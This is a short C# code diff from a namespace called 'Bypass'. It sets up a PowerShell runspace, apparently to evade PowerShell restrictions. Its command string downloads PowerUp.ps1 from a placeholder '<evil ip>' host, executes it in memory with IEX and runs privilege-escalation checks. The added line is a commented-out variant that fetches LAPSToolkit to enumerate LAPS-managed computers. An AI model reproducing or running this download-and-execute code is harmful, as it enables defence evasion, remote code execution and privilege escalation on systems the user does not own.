@@ -55,6 +55,7 @@ namespace Bypass
         {
             // change the command to whatever you want. Do note that the Out-File seems to be required in order to read the output because there doesnt seem to be any output to console
             String cmd = "(New-Object System.Net.WebClient).DownloadString('http://<evil ip>/powerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
+            // String cmd = "(New-Object System.Net.WebClient).DownloadString('http://<evil ip>/lapstoolkit.ps1') | IEX; Get-LAPSComputers | Out-File -FilePath C:\\Tools\\test.txt";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
 
